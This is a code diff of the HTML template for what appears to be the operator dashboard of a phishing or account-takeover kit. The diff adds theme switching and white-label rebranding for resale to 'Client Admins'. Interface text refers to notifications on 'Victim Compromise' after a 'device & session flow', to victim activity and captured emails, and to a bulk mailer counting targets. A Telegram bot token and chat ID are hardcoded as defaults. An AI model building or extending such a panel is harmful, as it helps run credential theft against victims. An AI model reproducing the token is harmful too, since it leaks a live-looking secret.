-                            <div style="background: #11090d; border: 1px solid #281014; border-radius: 10px; padding: 18px 22px; margin-bottom: 16px; width: 100%; box-sizing: border-box;">
-                                <div style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
+                            <div style="background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 10px; padding: 18px 22px; margin-bottom: 16px; width: 100%; box-sizing: border-box;">
+                                <div style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: var(--text-secondary); text-transform: uppercase;">
                                     2FA ENFORCEMENT POLICY
                                 </div>
                                 <div style="margin-top: 10px;">
-                                    <select id="setting-2fa-enforcement" class="dm-select" style="background: #0d0609; border: 1px solid #281014; border-radius: 8px; padding: 10px 14px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box; cursor: pointer;">
+                                    <select id="setting-2fa-enforcement" class="dm-select" style="background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 10px 14px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box; cursor: pointer;">
                                         <option value="disabled">⚪ Inactive / Optional (Default)</option>
                                         <option value="enabled">🟢 Active / Enforced for All Accounts</option>
                                     </select>
@@ -2815,8 +3074,8 @@ HTML_TEMPLATE = r'''
                             </div>
 
                             <!-- Card 2: OPERATOR POLICY -->
-                            <div style="background: #11090d; border: 1px solid #281014; border-radius: 10px; padding: 18px 22px; width: 100%; box-sizing: border-box;">
-                                <div style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
+                            <div style="background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 10px; padding: 18px 22px; width: 100%; box-sizing: border-box;">
+                                <div style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: var(--text-secondary); text-transform: uppercase;">
                                     OPERATOR ACCESS METHOD
                                 </div>
                                 <div style="font-size: 14.5px; font-weight: 600; color: #f0ebed; margin-top: 8px;">
@@ -2827,37 +3086,37 @@ HTML_TEMPLATE = r'''
 
                         <!-- Right Column: 2FA Setup -->
                         <div>
-                            <div style="font-size: 11px; font-weight: 800; letter-spacing: 0.1em; color: #8e7d82; text-transform: uppercase; margin-bottom: 4px;">
+                            <div style="font-size: 11px; font-weight: 800; letter-spacing: 0.1em; color: var(--text-secondary); text-transform: uppercase; margin-bottom: 4px;">
                                 2FA CONFIGURATION
                             </div>
                             <div style="font-size: 16px; font-weight: 700; color: #ffffff; margin-bottom: 18px;">
                                 Configure 2FA controls
                             </div>
 
-                            <div style="background: #11090d; border: 1px solid #281014; border-radius: 10px; padding: 22px; display: flex; flex-direction: column; gap: 16px; width: 100%; box-sizing: border-box;">
+                            <div style="background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 10px; padding: 22px; display: flex; flex-direction: column; gap: 16px; width: 100%; box-sizing: border-box;">
                                 <div style="display: flex; flex-direction: column; gap: 6px;">
-                                    <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
+                                    <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: var(--text-secondary); text-transform: uppercase;">
                                         AUTHENTICATION METHOD
                                     </label>
-                                    <select id="setting-2fa-method" class="dm-select" style="background: #0d0609; border: 1px solid #281014; border-radius: 8px; padding: 12px 16px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box; cursor: pointer;">
+                                    <select id="setting-2fa-method" class="dm-select" style="background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 16px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box; cursor: pointer;">
                                         <option value="telegram">✈️ Telegram Bot Push Verification (Recommended)</option>
                                         <option value="totp">📱 Authenticator App (Google / Microsoft Authenticator TOTP)</option>
                                     </select>
                                 </div>
 
                                 <div style="display: flex; flex-direction: column; gap: 6px;">
-                                    <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
+                                    <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: var(--text-secondary); text-transform: uppercase;">
                                         BACKUP VERIFICATION CODE / ACCESS PIN
                                     </label>
-                                    <input type="text" id="setting-2fa-pin" placeholder="Enter optional backup PIN" style="background: #0d0609; border: 1px solid #281014; border-radius: 8px; padding: 12px 16px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box; outline: none;">
+                                    <input type="text" id="setting-2fa-pin" placeholder="Enter optional backup PIN" style="background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 16px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box; outline: none;">
                                 </div>
 
-                                <div style="font-size: 0.8rem; color: #a49498; background: #0c0709; border: 1px solid #240d11; border-radius: 8px; padding: 14px 16px; line-height: 1.5;">
+                                <div style="font-size: 0.8rem; color: #a49498; background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 16px; line-height: 1.5;">
                                     💡 <strong>2FA Configuration:</strong> Choose your preferred verification method and click Save to apply preferences.
                                 </div>
 
                                 <div style="display: flex; justify-content: flex-start; margin-top: 4px;">
-                                    <button type="button" onclick="save2FAPreferences()" style="background: linear-gradient(135deg, #e50914, #b00710); color: #ffffff; border: none; padding: 12px 28px; border-radius: 8px; font-size: 12px; font-weight: 800; letter-spacing: 0.08em; text-transform: uppercase; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 14px rgba(229, 9, 20, 0.35);">
+                                    <button type="button" onclick="save2FAPreferences()" style="background: var(--accent-gradient); color: #ffffff; border: none; padding: 12px 28px; border-radius: 8px; font-size: 12px; font-weight: 800; letter-spacing: 0.08em; text-transform: uppercase; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 14px var(--accent-glow);">
                                         💾 SAVE 2FA PREFERENCES
                                     </button>
                                 </div>
@@ -2868,14 +3127,14 @@ HTML_TEMPLATE = r'''
 
                 <!-- TAB 3: Telegram (100% Full Width) -->
                 <div id="settings-pane-telegram" style="display: none; width: 100%; box-sizing: border-box;">
-                    <div style="font-size: 11px; font-weight: 800; letter-spacing: 0.1em; color: #8e7d82; text-transform: uppercase; margin-bottom: 4px;">
+                    <div style="font-size: 11px; font-weight: 800; letter-spacing: 0.1em; color: var(--text-secondary); text-transform: uppercase; margin-bottom: 4px;">
                         TELEGRAM BOT
                     </div>
                     <div style="font-size: 16px; font-weight: 700; color: #ffffff; margin-bottom: 18px;">
                         Alert &amp; notification integration
                     </div>
 
-                    <div style="background: #11090d; border: 1px solid #281014; border-radius: 10px; padding: 28px; display: flex; flex-direction: column; gap: 20px; width: 100%; box-sizing: border-box;">
+                    <div style="background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 10px; padding: 28px; display: flex; flex-direction: column; gap: 20px; width: 100%; box-sizing: border-box;">
                         <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px;">
                             <span style="font-weight: 700; font-size: 1rem; color: #ffffff; display: flex; align-items: center; gap: 8px;">
                                 <span>✈️</span> Telegram Bot Configuration
@@ -2887,27 +3146,27 @@ HTML_TEMPLATE = r'''
 
                         <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; width: 100%; box-sizing: border-box;">
                             <div style="display: flex; flex-direction: column; gap: 6px;">
-                                <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
+                                <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: var(--text-secondary); text-transform: uppercase;">
                                     TELEGRAM BOT TOKEN
                                 </label>
-                                <input type="password" id="setting-tg-bot-token" class="dm-input" value="8969682315:AAFcX748SNUsjXYj9OFM_g3zZJJ2w4Ljc7c" placeholder="e.g. 7123456789:AAHkXYZ..." style="background: #0d0609; border: 1px solid #281014; border-radius: 8px; padding: 12px 16px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box;">
+                                <input type="password" id="setting-tg-bot-token" class="dm-input" value="8969682315:AAFcX748SNUsjXYj9OFM_g3zZJJ2w4Ljc7c" placeholder="e.g. 7123456789:AAHkXYZ..." style="background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 16px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box;">
                             </div>
                             <div style="display: flex; flex-direction: column; gap: 6px;">
-                                <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
+                                <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: var(--text-secondary); text-transform: uppercase;">
                                     TELEGRAM CHAT ID
                                 </label>
-                                <input type="text" id="setting-tg-chat-id" class="dm-input" value="7922291087" placeholder="e.g. 123456789" style="background: #0d0609; border: 1px solid #281014; border-radius: 8px; padding: 12px 16px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box;">
+                                <input type="text" id="setting-tg-chat-id" class="dm-input" value="7922291087" placeholder="e.g. 123456789" style="background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 16px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box;">
                             </div>
                         </div>
 
                         <div style="display: flex; gap: 20px; align-items: center; flex-wrap: wrap; padding-top: 6px;">
                             <label style="display: flex; align-items: center; gap: 9px; cursor: pointer; font-size: 0.88rem; color: #f0ebed;">
-                                <input type="checkbox" id="setting-notify-token" checked style="accent-color: #e50914; width: 17px; height: 17px;">
+                                <input type="checkbox" id="setting-notify-token" checked style="accent-color: var(--accent-color); width: 17px; height: 17px;">
                                 <span>Notify on Victim Compromise (Dispatched once entire device &amp; session flow completes)</span>
                             </label>
                         </div>
 
-                        <div style="font-size: 0.8rem; color: #a49498; line-height: 1.6; background: #0c0709; border: 1px solid #240d11; border-radius: 8px; padding: 14px 16px;">
+                        <div style="font-size: 0.8rem; color: #a49498; line-height: 1.6; background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 16px;">
                             💡 <strong style="color: #f0ebed;">Quick Setup Guide:</strong><br>
                             1. Open Telegram and search <b>@BotFather</b>. Send <code>/newbot</code>, follow the prompts, and copy the <b>Bot Token</b>.<br>
                             2. Open your new bot and tap <b>Start</b> (or send <code>/start</code>).<br>
@@ -2916,27 +3175,183 @@ HTML_TEMPLATE = r'''
                         </div>
 
                         <div style="display: flex; justify-content: flex-end; padding-top: 6px;">
-                            <button type="button" class="btn btn-primary" onclick="saveTelegramSettings()" style="background: linear-gradient(135deg, #e50914, #b00710); padding: 11px 26px; font-weight: 700; font-size: 13px; border-radius: 8px;">
+                            <button type="button" class="btn btn-primary" onclick="saveTelegramSettings()" style="background: var(--accent-gradient); padding: 11px 26px; font-weight: 700; font-size: 13px; border-radius: 8px;">
                                 💾 Save Telegram Settings
                             </button>
                         </div>
                     </div>
                 </div>
+
+                {% if is_master_admin %}
+                <!-- TAB 4: Theme & Appearance (Master Host Only) -->
+                <div id="settings-pane-theme" style="display: none; width: 100%; box-sizing: border-box;">
+                    <div style="font-size: 11px; font-weight: 800; letter-spacing: 0.1em; color: var(--accent-color); text-transform: uppercase; margin-bottom: 4px; display: flex; align-items: center; gap: 6px;">
+                        <span>🛡️</span> MASTER HOST EXCLUSIVE CONTROLS
+                    </div>
+                    <div style="font-size: 16px; font-weight: 700; color: #ffffff; margin-bottom: 18px;">
+                        Global Theme &amp; Identity Architecture
+                    </div>
+
+                    <div style="background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 10px; padding: 28px; display: flex; flex-direction: column; gap: 28px; width: 100%; box-sizing: border-box;">
+                        
+                        <!-- Section: Theme Palettes Grid -->
+                        <div>
+                            <div style="font-size: 11px; font-weight: 800; letter-spacing: 0.08em; color: var(--text-secondary); text-transform: uppercase; margin-bottom: 12px;">
+                                SELECT PLATFORM THEME (INSTANT LIVE SWITCHER)
+                            </div>
+                            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px;" id="theme-selection-grid">
+                                
+                                <!-- Card: Crimson -->
+                                <div class="theme-card" onclick="selectTheme('crimson')" id="theme-card-crimson" style="background: #11090d; border: 2px solid {{ 'var(--accent-color)' if (active_theme or 'crimson') == 'crimson' else '#281014' }}; border-radius: 10px; padding: 18px; cursor: pointer; transition: all 0.2s ease; position: relative;">
+                                    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px;">
+                                        <span style="font-weight: 800; font-size: 13.5px; color: #ffffff;">Crimson Blood</span>
+                                        <span class="theme-tag" id="theme-tag-crimson" style="font-size: 9.5px; font-weight: 800; background: #e50914; color: #fff; padding: 2px 7px; border-radius: 10px; display: {{ 'inline-block' if (active_theme or 'crimson') == 'crimson' else 'none' }};">ACTIVE</span>
+                                    </div>
+                                    <div style="display: flex; gap: 6px; margin-bottom: 10px;">
+                                        <div style="width: 22px; height: 22px; border-radius: 4px; background: #e50914; box-shadow: 0 0 8px rgba(229,9,20,0.5);"></div>
+                                        <div style="width: 22px; height: 22px; border-radius: 4px; background: #0a0709; border: 1px solid #333;"></div>
+                                        <div style="width: 22px; height: 22px; border-radius: 4px; background: #161014; border: 1px solid #444;"></div>
+                                    </div>
+                                    <div style="font-size: 11px; color: #a49498; line-height: 1.4;">Signature carbon dark with sharp ruby red accents &amp; crimson glows.</div>
+                                </div>
+
+                                <!-- Card: Cyber Blue -->
+                                <div class="theme-card" onclick="selectTheme('blue')" id="theme-card-blue" style="background: #080f1d; border: 2px solid {{ 'var(--accent-color)' if active_theme == 'blue' else '#16264c' }}; border-radius: 10px; padding: 18px; cursor: pointer; transition: all 0.2s ease; position: relative;">
+                                    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px;">
+                                        <span style="font-weight: 800; font-size: 13.5px; color: #ffffff;">Cyber Blue</span>
+                                        <span class="theme-tag" id="theme-tag-blue" style="font-size: 9.5px; font-weight: 800; background: #0084ff; color: #fff; padding: 2px 7px; border-radius: 10px; display: {{ 'inline-block' if active_theme == 'blue' else 'none' }};">ACTIVE</span>
+                                    </div>
+                                    <div style="display: flex; gap: 6px; margin-bottom: 10px;">
+                                        <div style="width: 22px; height: 22px; border-radius: 4px; background: #0084ff; box-shadow: 0 0 8px rgba(0,132,255,0.5);"></div>
+                                        <div style="width: 22px; height: 22px; border-radius: 4px; background: #050a14; border: 1px solid #333;"></div>
+                                        <div style="width: 22px; height: 22px; border-radius: 4px; background: #0d172e; border: 1px solid #444;"></div>
+                                    </div>
+                                    <div style="font-size: 11px; color: #8da2c0; line-height: 1.4;">Metallic navy base with electric sapphire accents &amp; cyan glowing highlights.</div>
+                                </div>
+
+                                <!-- Card: Toxic Green -->
+                                <div class="theme-card" onclick="selectTheme('green')" id="theme-card-green" style="background: #06140b; border: 2px solid {{ 'var(--accent-color)' if active_theme == 'green' else '#154522' }}; border-radius: 10px; padding: 18px; cursor: pointer; transition: all 0.2s ease; position: relative;">
+                                    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px;">
+                                        <span style="font-weight: 800; font-size: 13.5px; color: #ffffff;">Matrix Green</span>
+                                        <span class="theme-tag" id="theme-tag-green" style="font-size: 9.5px; font-weight: 800; background: #00e676; color: #000; padding: 2px 7px; border-radius: 10px; display: {{ 'inline-block' if active_theme == 'green' else 'none' }};">ACTIVE</span>
+                                    </div>
+                                    <div style="display: flex; gap: 6px; margin-bottom: 10px;">
+                                        <div style="width: 22px; height: 22px; border-radius: 4px; background: #00e676; box-shadow: 0 0 8px rgba(0,230,118,0.5);"></div>
+                                        <div style="width: 22px; height: 22px; border-radius: 4px; background: #051208; border: 1px solid #333;"></div>
+                                        <div style="width: 22px; height: 22px; border-radius: 4px; background: #0e2b16; border: 1px solid #444;"></div>
+                                    </div>
+                                    <div style="font-size: 11px; color: #8dc09a; line-height: 1.4;">Deep obsidian carbon with vivid toxic matrix green neon accents.</div>
+                                </div>
+
+                                <!-- Card: Phantom Purple -->
+                                <div class="theme-card" onclick="selectTheme('purple')" id="theme-card-purple" style="background: #0e071c; border: 2px solid {{ 'var(--accent-color)' if active_theme == 'purple' else '#311860' }}; border-radius: 10px; padding: 18px; cursor: pointer; transition: all 0.2s ease; position: relative;">
+                                    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px;">
+                                        <span style="font-weight: 800; font-size: 13.5px; color: #ffffff;">Phantom Purple</span>
+                                        <span class="theme-tag" id="theme-tag-purple" style="font-size: 9.5px; font-weight: 800; background: #a855f7; color: #fff; padding: 2px 7px; border-radius: 10px; display: {{ 'inline-block' if active_theme == 'purple' else 'none' }};">ACTIVE</span>
+                                    </div>
+                                    <div style="display: flex; gap: 6px; margin-bottom: 10px;">
+                                        <div style="width: 22px; height: 22px; border-radius: 4px; background: #a855f7; box-shadow: 0 0 8px rgba(168,85,247,0.5);"></div>
+                                        <div style="width: 22px; height: 22px; border-radius: 4px; background: #0a0514; border: 1px solid #333;"></div>
+                                        <div style="width: 22px; height: 22px; border-radius: 4px; background: #1b0e36; border: 1px solid #444;"></div>
+                                    </div>
+                                    <div style="font-size: 11px; color: #aa95c4; line-height: 1.4;">Deep violet abyss with electric amethyst glows &amp; purple trims.</div>
+                                </div>
+
+                                <!-- Card: Solar Amber -->
+                                <div class="theme-card" onclick="selectTheme('amber')" id="theme-card-amber" style="background: #170f05; border: 2px solid {{ 'var(--accent-color)' if active_theme == 'amber' else '#4a3114' }}; border-radius: 10px; padding: 18px; cursor: pointer; transition: all 0.2s ease; position: relative;">
+                                    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px;">
+                                        <span style="font-weight: 800; font-size: 13.5px; color: #ffffff;">Solar Amber</span>
+                                        <span class="theme-tag" id="theme-tag-amber" style="font-size: 9.5px; font-weight: 800; background: #f59e0b; color: #000; padding: 2px 7px; border-radius: 10px; display: {{ 'inline-block' if active_theme == 'amber' else 'none' }};">ACTIVE</span>
+                                    </div>
+                                    <div style="display: flex; gap: 6px; margin-bottom: 10px;">
+                                        <div style="width: 22px; height: 22px; border-radius: 4px; background: #f59e0b; box-shadow: 0 0 8px rgba(245,158,11,0.5);"></div>
+                                        <div style="width: 22px; height: 22px; border-radius: 4px; background: #120c04; border: 1px solid #333;"></div>
+                                        <div style="width: 22px; height: 22px; border-radius: 4px; background: #291b0b; border: 1px solid #444;"></div>
+                                    </div>
+                                    <div style="font-size: 11px; color: #c4ad8d; line-height: 1.4;">Warm carbon slate with radiant golden amber &amp; solar cyber trims.</div>
+                                </div>
+
+                                <!-- Card: Titanium Slate -->
+                                <div class="theme-card" onclick="selectTheme('titanium')" id="theme-card-titanium" style="background: #0d1017; border: 2px solid {{ 'var(--accent-color)' if active_theme == 'titanium' else '#28303d' }}; border-radius: 10px; padding: 18px; cursor: pointer; transition: all 0.2s ease; position: relative;">
+                                    <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px;">
+                                        <span style="font-weight: 800; font-size: 13.5px; color: #ffffff;">Titanium Slate</span>
+                                        <span class="theme-tag" id="theme-tag-titanium" style="font-size: 9.5px; font-weight: 800; background: #38bdf8; color: #000; padding: 2px 7px; border-radius: 10px; display: {{ 'inline-block' if active_theme == 'titanium' else 'none' }};">ACTIVE</span>
+                                    </div>
+                                    <div style="display: flex; gap: 6px; margin-bottom: 10px;">
+                                        <div style="width: 22px; height: 22px; border-radius: 4px; background: #38bdf8; box-shadow: 0 0 8px rgba(56,189,248,0.5);"></div>
+                                        <div style="width: 22px; height: 22px; border-radius: 4px; background: #0a0c10; border: 1px solid #333;"></div>
+                                        <div style="width: 22px; height: 22px; border-radius: 4px; background: #191e26; border: 1px solid #444;"></div>
+                                    </div>
+                                    <div style="font-size: 11px; color: #94a3b8; line-height: 1.4;">Tactical stealth slate with cold titanium steel &amp; sky blue accents.</div>
+                                </div>
+
+                            </div>
+                        </div>
+
+                        <!-- Section: White-Label Platform Identity -->
+                        <div style="border-top: 1px solid var(--border-color); padding-top: 24px;">
+                            <div style="font-size: 11px; font-weight: 800; letter-spacing: 0.08em; color: var(--text-secondary); text-transform: uppercase; margin-bottom: 16px;">
+                                PLATFORM REBRANDING &amp; CLIENT WHITE-LABEL
+                            </div>
+                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 24px; width: 100%; box-sizing: border-box; align-items: start;">
+                                <div style="display: flex; flex-direction: column; gap: 6px;">
+                                    <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
+                                        PLATFORM / APP TITLE
+                                    </label>
+                                    <input type="text" id="setting-platform-name" class="dm-input" value="{{ platform_name or 'CRIMSON PAW' }}" placeholder="e.g. ACME GATEWAY, APEX CYBER" style="background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 16px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box; outline: none;">
+                                    <span style="font-size: 11px; color: #a49498; margin-top: 2px;">Reflected across Dashboard, Sidebar, Landing Page, and Login title.</span>
+                                </div>
+
+                                <div style="display: flex; flex-direction: column; gap: 8px;">
+                                    <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
+                                        PLATFORM LOGO (FILE UPLOAD OR URL)
+                                    </label>
+                                    <div style="display: flex; align-items: center; gap: 14px; background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 16px;">
+                                        <img id="theme-logo-preview" src="{{ custom_logo_url or '/static/img/crimson_paw_logo.png' }}" style="width: 44px; height: 44px; border-radius: 8px; border: 1px solid var(--accent-glow); box-shadow: 0 0 10px var(--accent-glow); object-fit: contain; background: #000;">
+                                        <div style="display: flex; flex-direction: column; gap: 6px; flex: 1;">
+                                            <div style="display: flex; gap: 8px; align-items: center;">
+                                                <input type="file" id="logo-file-picker" accept=".png,.jpg,.jpeg,.svg,.webp,.ico" style="display: none;" onchange="handleLogoFileSelected(event)">
+                                                <button type="button" class="btn btn-primary btn-sm" onclick="document.getElementById('logo-file-picker').click()" style="background: var(--accent-gradient); padding: 7px 14px; font-weight: 700; font-size: 11.5px; border-radius: 6px;">
+                                                    📁 Upload Logo File
+                                                </button>
+                                                <span id="logo-upload-status" style="font-size: 11px; color: #a49498;">PNG, JPG, SVG, WEBP</span>
+                                            </div>
+                                            <input type="text" id="setting-custom-logo-url" class="dm-input" value="{{ custom_logo_url or '' }}" placeholder="Or paste external image URL" style="background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 6px; padding: 6px 10px; color: #ffffff; font-size: 11.5px; width: 100%; box-sizing: border-box; outline: none;" oninput="updateLogoPreviewFromUrl(this.value)">
+                                        </div>
+                                    </div>
+                                    <span style="font-size: 11px; color: #a49498;">Propagates globally to Landing Page, Login Page, Sidebar, and Favicon.</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Save Button & Master Host Lock Notice -->
+                        <div style="display: flex; justify-content: space-between; align-items: center; border-top: 1px solid var(--border-color); padding-top: 20px; flex-wrap: wrap; gap: 14px;">
+                            <div style="font-size: 12px; color: #8e7d82; display: flex; align-items: center; gap: 8px;">
+                                <span>🔒</span> <i>This tab is invisible and locked to Client Admins. Only Master Host sessions can modify themes.</i>
+                            </div>
+                            <button type="button" class="btn btn-primary" onclick="saveMasterThemeSettings()" style="background: var(--accent-gradient); padding: 12px 28px; font-weight: 800; font-size: 13px; border-radius: 8px; letter-spacing: 0.04em;">
+                                💾 SAVE THEME &amp; REBRANDING TO SERVER
+                            </button>
+                        </div>
+
+                    </div>
+                </div>
+                {% endif %}
             </div>
 
             <!-- Inline Standalone Controller to Guarantee Instant Clickability & Scope -->
             <script>
             (function() {
                 window.switchSettingsTab = function(tab) {
-                    const tabs = ['account', '2fa', 'telegram'];
+                    const tabs = ['account', '2fa', 'telegram', 'theme'];
                     tabs.forEach(function(t) {
                         const pane = document.getElementById('settings-pane-' + t);
                         const btn = document.getElementById('settings-tab-btn-' + t);
                         const isActive = (t === tab);
                         if (pane) pane.style.display = isActive ? 'block' : 'none';
                         if (btn) {
-                            btn.style.background = isActive ? '#2a0f14' : 'transparent';
-                            btn.style.borderColor = isActive ? '#e50914' : 'transparent';
+                            btn.style.background = isActive ? 'var(--border-color)' : 'transparent';
+                            btn.style.borderColor = isActive ? 'var(--accent-color)' : 'transparent';
                             btn.style.color = isActive ? '#ffffff' : '#a49498';
                             btn.style.fontWeight = isActive ? '700' : '600';
                         }
@@ -2945,7 +3360,7 @@ HTML_TEMPLATE = r'''
 
                 // Attach direct click listeners once loaded
                 function bindSettingsTabEvents() {
-                    ['account', '2fa', 'telegram'].forEach(function(t) {
+                    ['account', '2fa', 'telegram', 'theme'].forEach(function(t) {
                         const btn = document.getElementById('settings-tab-btn-' + t);
                         if (btn) {
                             btn.addEventListener('click', function(e) {
@@ -3111,15 +3526,15 @@ HTML_TEMPLATE = r'''
 
     <!-- App Confirm Modal (Themed In-App Confirmation Dialog) -->
     <div id="appConfirmModal" class="modal-overlay" style="z-index: 99999;">
-        <div class="modal" style="max-width: 440px; background: #130d10; border: 1px solid #4a191f; border-radius: 14px; box-shadow: 0 20px 50px rgba(0,0,0,0.85); padding: 24px;">
+        <div class="modal" style="max-width: 440px; background: var(--bg-sidebar); border: 1px solid var(--border-color); border-radius: 14px; box-shadow: 0 20px 50px rgba(0,0,0,0.85); padding: 24px;">
             <div style="display:flex; align-items:center; gap:12px; margin-bottom:14px;">
-                <div id="appConfirmIcon" style="width:40px; height:40px; border-radius:50%; background:rgba(229,9,20,0.15); border:1px solid rgba(229,9,20,0.3); display:flex; align-items:center; justify-content:center; font-size:20px; flex-shrink:0;">🗑️</div>
+                <div id="appConfirmIcon" style="width:40px; height:40px; border-radius:50%; background:var(--badge-bg); border:1px solid var(--badge-border); color:var(--accent-color); display:flex; align-items:center; justify-content:center; font-size:20px; flex-shrink:0;">🗑️</div>
                 <h3 id="appConfirmTitle" style="color:#ffffff; font-size:1.1rem; font-weight:700; margin:0; letter-spacing:0.01em;">Confirm Action</h3>
             </div>
-            <p id="appConfirmMessage" style="color:#c5b4b8; font-size:0.88rem; line-height:1.55; margin-bottom:22px;">Are you sure you want to proceed?</p>
+            <p id="appConfirmMessage" style="color:var(--text-secondary); font-size:0.88rem; line-height:1.55; margin-bottom:22px;">Are you sure you want to proceed?</p>
             <div style="display:flex; justify-content:flex-end; gap:10px;">
-                <button type="button" class="btn btn-secondary" onclick="closeAppConfirm(false)" style="padding:8px 18px; font-size:0.84rem; background:#22171a; border-color:#3d2026; color:#e0d2d6;">Cancel</button>
-                <button type="button" id="appConfirmBtn" class="btn" onclick="closeAppConfirm(true)" style="background:#e50914; color:#ffffff; border:none; padding:8px 20px; font-size:0.84rem; font-weight:700; border-radius:6px; box-shadow:0 4px 14px rgba(229,9,20,0.4);">Confirm</button>
+                <button type="button" class="btn btn-secondary" onclick="closeAppConfirm(false)" style="padding:8px 18px; font-size:0.84rem; background:var(--bg-panel); border:1px solid var(--border-color); color:var(--text-secondary);">Cancel</button>
+                <button type="button" id="appConfirmBtn" class="btn" onclick="closeAppConfirm(true)" style="background:var(--accent-gradient); color:#ffffff; border:1px solid rgba(255,255,255,0.15); padding:8px 20px; font-size:0.84rem; font-weight:700; border-radius:6px; box-shadow:0 4px 14px var(--accent-glow);">Confirm</button>
             </div>
         </div>
     </div>
@@ -3289,7 +3704,7 @@ HTML_TEMPLATE = r'''
                                 </div>
                                 <div class="b2b-out-chip" title="Failed sends">
                                     <span class="b2b-out-chip-label">Failed</span>
-                                    <span id="b2b-fail-ct" class="b2b-out-chip-val" style="color:#f85149">0</span>
+                                    <span id="b2b-fail-ct" class="b2b-out-chip-val" style="color:var(--accent-color)">0</span>
                                 </div>
                                 <div class="b2b-out-chip" title="Total targets">
                                     <span class="b2b-out-chip-label">Total</span>
@@ -3356,7 +3771,7 @@ HTML_TEMPLATE = r'''
                             <button class="b2b-tb-btn" onclick="b2bExec('underline')" title="Underline"><u>U</u></button>
                             <div class="b2b-tb-sep"></div>
                             <label class="b2b-tb-btn" title="Text colour" style="cursor:pointer">A<input type="color" style="display:none;width:0;height:0" onchange="b2bExec('foreColor',this.value)"></label>
-                            <label class="b2b-tb-btn" title="Highlight" style="cursor:pointer;background:rgba(229,9,20,.25)">HL<input type="color" style="display:none;width:0;height:0" onchange="b2bExec('hiliteColor',this.value)"></label>
+                            <label class="b2b-tb-btn" title="Highlight" style="cursor:pointer;background:var(--badge-bg);border:1px solid var(--badge-border);color:var(--accent-color);">HL<input type="color" style="display:none;width:0;height:0" onchange="b2bExec('hiliteColor',this.value)"></label>
                             <div class="b2b-tb-sep"></div>
                             <button class="b2b-tb-btn" onclick="insertB2BLink()" title="Insert link">🔗</button>
                             <button class="b2b-tb-btn" onclick="b2bExec('insertOrderedList')" title="Ordered list">1.</button>
@@ -3467,24 +3882,24 @@ HTML_TEMPLATE = r'''
                     <button class="ai-modal-close" onclick="closeOperatorTelegramModal()">✕</button>
                 </div>
                 <div class="ai-modal-body" style="gap:14px; padding:20px;">
-                    <div style="background:rgba(88, 166, 255, 0.08); border:1px solid rgba(88, 166, 255, 0.25); border-radius:8px; padding:12px; font-size:0.82rem; color:#c9d1d9; line-height:1.4;">
+                    <div style="background:var(--bg-panel); border:1px solid var(--border-color); border-radius:8px; padding:12px; font-size:0.82rem; color:var(--text-secondary); line-height:1.4;">
                         Connect your dedicated Telegram bot to receive real-time notifications for incoming emails, keyword alerts, and victim activity directly in your chat.
                     </div>
                     <div class="ai-opt-group">
-                        <div class="ai-section-label" style="color:#ff858c; font-weight:700;">TELEGRAM BOT TOKEN</div>
